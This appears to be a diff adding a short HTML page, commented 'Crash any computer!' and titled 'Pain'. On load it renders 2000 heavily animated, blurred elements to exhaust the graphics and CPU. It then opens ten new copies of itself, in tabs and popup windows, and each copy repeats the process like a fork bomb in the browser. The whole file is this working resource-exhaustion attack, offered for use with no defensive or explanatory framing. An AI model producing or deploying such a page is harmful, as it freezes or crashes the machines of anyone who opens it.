@@ -1,0 +1,73 @@
+<!-- Crash any computer! -->
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Pain</title>
+        <style>
+            body {
+                background-color: #111;
+                overflow: hidden;
+            }
+
+            .heavy-div {
+                width: 10px;
+                height: 10px;
+                position: absolute;
+                border-radius: 50%;
+                animation: killer-animation 5s infinite alternate;
+            }
+
+            @keyframes killer-animation {
+                0% {
+                    box-shadow: 0 0 20px 10px hsla(180, 100%, 50%, 0.8);
+                    filter: blur(2px);
+                    transform: scale(1) rotate(0deg);
+                }
+                100% {
+                    box-shadow: 0 0 40px 20px hsla(300, 100%, 50%, 0.5);
+                    filter: blur(5px) hue-rotate(360deg);
+                    transform: scale(1.5) rotate(360deg);
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <script>
+
+            const numOfDivs = 2000;
+
+            const fragment = document.createDocumentFragment();
+
+            for (let i = 0; i < numOfDivs; i++) {
+                const div = document.createElement("div");
+                div.className = "heavy-div";
+
+                div.style.left = `${Math.random() * 100}vw`;
+                div.style.top = `${Math.random() * 100}vh`;
+
+                div.style.animationDelay = `${Math.random() * -5}s`;
+
+                fragment.appendChild(div);
+            }
+
+            document.body.appendChild(fragment);
+
+            const currentURL = window.location.href;
+
+            const dupeAmountTabs = 5;
+            const dupeAmountWindows = 5;
+            const windowFeatures = 'popup=true,width=256,height=256,scrollbar=no,resizable=yes';
+
+            for (let i = 0; i < dupeAmountTabs; i++) {
+                window.open(currentURL, '_blank');
+            }
+
+            for (let i = 0; i < dupeAmountTabs; i++) {
+                window.open(currentURL, '_blank', windowFeatures);
+            }
+        </script>
+    </body>
+</html>
